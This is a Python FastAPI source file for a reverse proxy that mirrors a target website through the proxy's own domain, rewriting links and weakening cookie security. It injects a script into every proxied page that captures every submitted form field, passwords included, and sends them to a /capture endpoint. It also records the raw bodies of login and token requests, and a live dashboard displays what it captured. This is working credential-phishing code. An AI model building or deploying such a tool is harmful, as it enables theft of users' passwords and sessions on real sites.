import re
import time
import uuid
import json
import asyncio
import httpx
import websockets
from typing import Dict, List
from datetime import datetime
from contextlib import asynccontextmanager
from bs4 import BeautifulSoup
from fastapi import FastAPI, Request, Response, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import StreamingResponse, JSONResponse, HTMLResponse
from urllib.parse import urljoin, urlparse

# =========================================================
# [CONFIGURATION & CONSTANTS]
# =========================================================
TARGET_BASE = "https://zzzzzzzzzzzz-unrecessively-zzzzzzzzz.ngrok-free.dev/"
parsed_target = urlparse(TARGET_BASE)
TARGET_DOMAIN = parsed_target.netloc

HOP_BY_HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate",
    "proxy-authorization", "te", "trailers",
    "transfer-encoding", "upgrade", "host", "content-length",
    "content-encoding", "accept-encoding", "content-security-policy",
    "cookie" 
}

COOKIE_DOMAIN_RE = re.compile(r"(?i);\s*Domain=[^;]+")
AUTH_KEYWORDS = ["login", "auth", "signin", "token", "password"]

SESSION_FILE = "proxy_sessions.json"
SESSION_TIMEOUT = 1800

# =========================================================
# [UTILITIES]
# =========================================================
def rewrite_url(url: str, target_domain: str, proxy_domain: str) -> str:
    """Safely replace target domain with proxy domain in URLs."""
    if not url:
        return url
    if target_domain in url:
        rewritten = url.replace(target_domain, proxy_domain)
        rewritten = rewritten.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")
        return rewritten
    return url

# =========================================================
# [LOGGER MODULE] (Merged from Version A & Upgraded)
# =========================================================
class ProxyLogger:
    def __init__(self, max_logs=1000):
        self.logs: List[dict] = []
        self.max_logs = max_logs
        self.lock = asyncio.Lock()

    async def log_event(self, event_type: str, session_id: str = "N/A", method: str = "-", path: str = "-", status: int = 0, data: dict = None):
        """Thread-safe logging method for structured proxy events."""
        entry = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": event_type,
            "session_id": session_id,
            "method": method,
            "path": path,
            "status": status,
            "data": data or {}
        }
        async with self.lock:
            self.logs.insert(0, entry)  # Prepend newest logs
            if len(self.logs) > self.max_logs:
                self.logs.pop()

    async def get_logs(self) -> List[dict]:
        async with self.lock:
            return list(self.logs)

proxy_logger = ProxyLogger()

# =========================================================
# [SESSION MANAGER MODULE]
# =========================================================
class SessionManager:
    def __init__(self):
        self.sessions: Dict[str, dict] = {}
        self.lock = asyncio.Lock()

    async def load(self):
        try:
            with open(SESSION_FILE, "r") as f:
                data = json.load(f)
                async with self.lock:
                    self.sessions = data
            print(f"[*] Loaded {len(self.sessions)} sessions from disk.")
        except (FileNotFoundError, json.JSONDecodeError):
            print("[*] No existing session file found. Starting fresh.")

    async def save(self):
        async with self.lock:
            with open(SESSION_FILE, "w") as f:
                json.dump(self.sessions, f)

    async def get_or_create_session(self, session_id: str = None) -> str:
        async with self.lock:
            now = time.time()
            if session_id and session_id in self.sessions:
                self.sessions[session_id]["last_accessed"] = now
                return session_id
            
            new_id = str(uuid.uuid4())
            self.sessions[new_id] = {"cookies": {}, "last_accessed": now}
            
            # --- LOG: Session Creation ---
            asyncio.create_task(proxy_logger.log_event("session_created", session_id=new_id, data={"action": "new_session"}))
            
            return new_id

    async def get_cookies(self, session_id: str) -> dict:
        async with self.lock:
            session = self.sessions.get(session_id)
            if session:
                session["last_accessed"] = time.time()
                return session["cookies"].copy()
            return {}

    async def update_cookies(self, session_id: str, new_cookies: dict):
        if not new_cookies:
            return
        async with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]["cookies"].update(new_cookies)
        asyncio.create_task(self.save())

    async def cleanup_loop(self):
        while True:
            await asyncio.sleep(60) 
            now = time.time()
            expired_keys = []
            async with self.lock:
                for sid, data in self.sessions.items():
                    if now - data["last_accessed"] > SESSION_TIMEOUT:
                        expired_keys.append(sid)
                for sid in expired_keys:
                    del self.sessions[sid]
            
            if expired_keys:
                print(f"[*] Cleaned up {len(expired_keys)} expired sessions.")
                await self.save()

session_manager = SessionManager()

@asynccontextmanager
async def lifespan(app: FastAPI):
    await session_manager.load()
    cleanup_task = asyncio.create_task(session_manager.cleanup_loop())
    yield
    cleanup_task.cancel()
    await session_manager.save()

# =========================================================
# [APP INIT]
# =========================================================
app = FastAPI(lifespan=lifespan)
client = httpx.AsyncClient(follow_redirects=False, timeout=60.0)

# =========================================================
# CLIENT-SIDE FORM OBSERVATION SCRIPT
# =========================================================
FORM_OBSERVER_SCRIPT = """
<script>
(function() {
    console.log('[Proxy Observer] Form submission watcher injected');

    function captureFormData(form) {
        const formData = {};
        const inputs = form.querySelectorAll('input, textarea, select');

        inputs.forEach(input => {
            const name = input.name || input.id;
            if (!name) return;

            if (input.type === 'password') {
                formData[name] = input.value; 
            } else if (input.type === 'checkbox' || input.type === 'radio') {
                formData[name] = input.checked;
            } else if (input.tagName === 'SELECT') {
                formData[name] = input.value;
            } else {
                formData[name] = input.value;
            }
        });

        return {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            formAction: form.action || window.location.href,
            method: form.method.toUpperCase() || 'GET',
            formId: form.id || null,
            formData: formData
        };
    }

    function attachFormListeners() {
        document.querySelectorAll('form').forEach(form => {
            if (form.dataset.observerAttached) return;
            form.dataset.observerAttached = 'true';

            form.addEventListener('submit', function(e) {
                const captured = captureFormData(form);
                try {
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(captured),
                        keepalive: true
                    });
                    console.log('[Proxy Observer] Form submission captured:', captured);
                } catch (err) {
                    console.warn('[Proxy Observer] Failed to send form data:', err);
                }
            }, true); 
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', attachFormListeners);
    } else {
        attachFormListeners();
    }

    const observer = new MutationObserver(() => attachFormListeners());
    observer.observe(document.documentElement, { childList: true, subtree: true });
})();
</script>
"""

# =========================================================
# [DASHBOARD & LOGGING ENDPOINTS] (New)
# =========================================================
@app.get("/_proxy_api/logs")
async def get_api_logs():
    """JSON endpoint for retrieving structured logs."""
    logs = await proxy_logger.get_logs()
    return JSONResponse(content={"logs": logs})

@app.get("/_proxy_dashboard", response_class=HTMLResponse)
async def dashboard_ui():
    """Built-in HTML/JS dashboard for viewing logs in real-time."""
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Proxy Traffic Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            pre { white-space: pre-wrap; word-wrap: break-word; }
            .type-auth { color: #ef4444; font-weight: bold; }
            .type-capture { color: #f59e0b; font-weight: bold; }
            .type-request { color: #3b82f6; }
        </style>
    </head>
    <body class="bg-gray-900 text-gray-200 p-6 font-sans">
        <div class="max-w-7xl mx-auto">
            <div class="flex justify-between items-center mb-6">
                <h1 class="text-3xl font-bold text-white">📡 Live Proxy Dashboard</h1>
                <label class="flex items-center space-x-2 cursor-pointer">
                    <input type="checkbox" id="autoRefresh" class="form-checkbox h-5 w-5 text-blue-600" checked>
                    <span>Auto-Refresh (2s)</span>
                </label>
            </div>
            
            <div class="bg-gray-800 rounded-lg shadow overflow-hidden">
                <table class="min-w-full divide-y divide-gray-700">
                    <thead class="bg-gray-700">
                        <tr>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Time</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Type</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Session ID</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Method & Path</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Status</th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Data Payload</th>
                        </tr>
                    </thead>
                    <tbody id="logTableBody" class="divide-y divide-gray-700">
                        </tbody>
                </table>
            </div>
        </div>

        <script>
            let refreshInterval;
            
            async function fetchLogs() {
                try {
                    const res = await fetch('/_proxy_api/logs');
                    const data = await res.json();
                    const tbody = document.getElementById('logTableBody');
                    tbody.innerHTML = '';
                    
                    data.logs.forEach(log => {
                        const tr = document.createElement('tr');
                        
                        const timeStr = new Date(log.timestamp).toLocaleTimeString();
                        let typeClass = '';
                        if(log.type === 'auth_intercept') typeClass = 'type-auth';
                        else if(log.type === 'capture') typeClass = 'type-capture';
                        else typeClass = 'type-request';
                        
                        const dataStr = Object.keys(log.data).length ? JSON.stringify(log.data, null, 2) : '-';

                        tr.innerHTML = `
                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400">${timeStr}</td>
                            <td class="px-6 py-4 whitespace-nowrap text-sm ${typeClass}">${log.type.toUpperCase()}</td>
                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400" title="${log.session_id}">${log.session_id.substring(0,8)}...</td>
                            <td class="px-6 py-4 whitespace-nowrap text-sm"><span class="font-bold text-gray-300">${log.method}</span> ${log.path}</td>
                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400">${log.status || '-'}</td>
                            <td class="px-6 py-4 text-sm text-gray-300"><pre class="bg-gray-900 p-2 rounded text-xs">${dataStr}</pre></td>
                        `;
                        tbody.appendChild(tr);
                    });
                } catch (e) {
                    console.error("Failed to fetch logs", e);
                }
            }

            function toggleRefresh() {
                if (document.getElementById('autoRefresh').checked) {
                    refreshInterval = setInterval(fetchLogs, 2000);
                } else {
                    clearInterval(refreshInterval);
                }
            }

            document.getElementById('autoRefresh').addEventListener('change', toggleRefresh);
            fetchLogs();
            toggleRefresh();
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# =========================================================
# [CAPTURE ENDPOINT]
# =========================================================
@app.post("/capture")
async def capture_form_data(request: Request, data: dict):
    client_session_id = request.cookies.get("proxy_session_id", "N/A")
    
    # --- LOG: Form Capture ---
    await proxy_logger.log_event(
        event_type="capture", 
        session_id=client_session_id, 
        method=data.get("method", "POST"), 
        path=data.get("url", "/capture"), 
        data={"formData": data.get("formData", {})}
    )
    return JSONResponse(content={"status": "captured"}, status_code=200)

# =========================================================
# [WEBSOCKET PROXY MODULE] 
# =========================================================
@app.websocket("/{path:path}")
async def websocket_proxy(websocket: WebSocket, path: str):
    await websocket.accept()
    
    client_session_id = websocket.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create_session(client_session_id)
    session_cookies = await session_manager.get_cookies(session_id)
    
    cookie_str = "; ".join([f"{k}={v}" for k, v in session_cookies.items()])
    ws_headers = {"Cookie": cookie_str} if cookie_str else {}

    ws_base = TARGET_BASE.replace("https://", "wss://").replace("http://", "ws://")
    target_ws_url = urljoin(ws_base.rstrip("/") + "/", path)
    
    query_string = websocket.url.query
    if query_string:
        target_ws_url += f"?{query_string}"
    
    try:
        async with websockets.connect(target_ws_url, extra_headers=ws_headers) as target_ws:
            async def forward_to_target():
                try:
                    while True:
                        data = await websocket.receive_text()
                        await target_ws.send(data)
                except WebSocketDisconnect:
                    pass

            async def forward_to_client():
                try:
                    while True:
                        data = await target_ws.recv()
                        await websocket.send_text(data)
                except websockets.exceptions.ConnectionClosed:
                    pass

            await asyncio.gather(forward_to_target(), forward_to_client())
            
    except Exception:
        pass
    finally:
        try:
            await websocket.close()
        except:
            pass

# =========================================================
# [HTTP PROXY MODULE]
# =========================================================
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
async def proxy(request: Request, path: str):
    query_string = request.url.query
    target_url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
    if query_string:
        target_url += f"?{query_string}"

    proxy_base = str(request.base_url).rstrip("/")
    proxy_domain = urlparse(proxy_base).netloc

    client_session_id = request.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create_session(client_session_id)
    session_cookies = await session_manager.get_cookies(session_id)

    browser_cookies = dict(request.cookies)
    browser_cookies.pop("proxy_session_id", None)
    merged_cookies = {**session_cookies, **browser_cookies}

    req_headers = []
    for k, v in request.headers.items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue
        if k_lower in ("referer", "origin"):
            v = v.replace(proxy_domain, TARGET_DOMAIN)
            v = v.replace("http://", "https://") 
        req_headers.append((k, v))

    req_headers.append(("host", TARGET_DOMAIN))
    req_headers.append(("accept-encoding", "identity"))

    body = await request.body()
    log_data = {}

    # --- LOG & INTERCEPT: Auth Interception ---
    if request.method == "POST":
        path_lower = path.lower()
        if any(keyword in path_lower for keyword in AUTH_KEYWORDS):
            try:
                decoded = body.decode('utf-8', errors='replace')
                log_data["payload"] = decoded
                await proxy_logger.log_event("auth_intercept", session_id, request.method, f"/{path}", data=log_data)
            except Exception:
                pass

    try:
        proxy_req = client.build_request(
            method=request.method,
            url=target_url,
            headers=req_headers,
            content=body,
            cookies=merged_cookies
        )
        resp = await client.send(proxy_req, stream=True)
        
        # --- LOG: Standard Request ---
        if not log_data: # If it wasn't already logged as auth_intercept
             await proxy_logger.log_event("proxy_request", session_id, request.method, f"/{path}", status=resp.status_code)

    except httpx.RequestError as exc:
        await proxy_logger.log_event("proxy_error", session_id, request.method, f"/{path}", data={"error": str(exc)})
        raise HTTPException(status_code=502, detail=f"Proxy Link Error: {str(exc)}")

    if resp.cookies:
        await session_manager.update_cookies(session_id, dict(resp.cookies))

    processed_headers = []
    for k, v in resp.headers.multi_items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue

        if k_lower == "location":
            v = v.replace(TARGET_DOMAIN, proxy_domain).replace("https://", "http://")  
            processed_headers.append((k, v))
        elif k_lower == "set-cookie":
            v = COOKIE_DOMAIN_RE.sub("", v)
            v = re.sub(r"(?i);\s*Secure", "", v)
            v = re.sub(r"(?i);\s*SameSite=None", "; SameSite=Lax", v)
            processed_headers.append((k, v))
        else:
            processed_headers.append((k, v))

    content_type = resp.headers.get("content-type", "").lower()

    if any(t in content_type for t in ["text/html", "javascript", "json", "application/javascript"]):
        try:
            raw_bytes = await resp.aread()
        except httpx.ReadError as exc:
            await resp.aclose()
            raise HTTPException(status_code=502, detail="Upstream dropped connection.")

        text = raw_bytes.decode("utf-8", errors="ignore")

        if "text/html" in content_type:
            soup = BeautifulSoup(text, "html.parser")

            for tag in soup.find_all(['a', 'link', 'base'], href=True):
                tag['href'] = rewrite_url(tag['href'], TARGET_DOMAIN, proxy_domain)
            
            for tag in soup.find_all(['script', 'img', 'iframe', 'source', 'audio', 'video'], src=True):
                tag['src'] = rewrite_url(tag['src'], TARGET_DOMAIN, proxy_domain)
            
            for tag in soup.find_all('form', action=True):
                tag['action'] = rewrite_url(tag['action'], TARGET_DOMAIN, proxy_domain)

            observer_soup = BeautifulSoup(FORM_OBSERVER_SCRIPT, "html.parser")
            body_tag = soup.find('body')
            if body_tag:
                body_tag.append(observer_soup)
            else:
                soup.append(observer_soup)

            rewritten = str(soup)
        else:
            rewritten = text.replace(TARGET_DOMAIN, proxy_domain)
            rewritten = rewritten.replace("https://" + proxy_domain, "http://" + proxy_domain)

        final_response = Response(
            content=rewritten.encode("utf-8"),
            status_code=resp.status_code,
            media_type=content_type
        )
        await resp.aclose()

    else:
        async def safe_stream_generator():
            try:
                async for chunk in resp.aiter_bytes():
                    yield chunk
            except httpx.ReadError:
                pass
            finally:
                await resp.aclose()

        final_response = StreamingResponse(safe_stream_generator(), status_code=resp.status_code)

    if "content-length" in final_response.headers:
        del final_response.headers["content-length"]

    if client_session_id != session_id:
        final_response.set_cookie(
            key="proxy_session_id",
            value=session_id,
            httponly=True,
            samesite="Lax",
            max_age=SESSION_TIMEOUT
        )

    for k, v in processed_headers:
        if k.lower() in ("content-length", "content-type"):
            continue
        final_response.headers.append(k, v)

    return final_response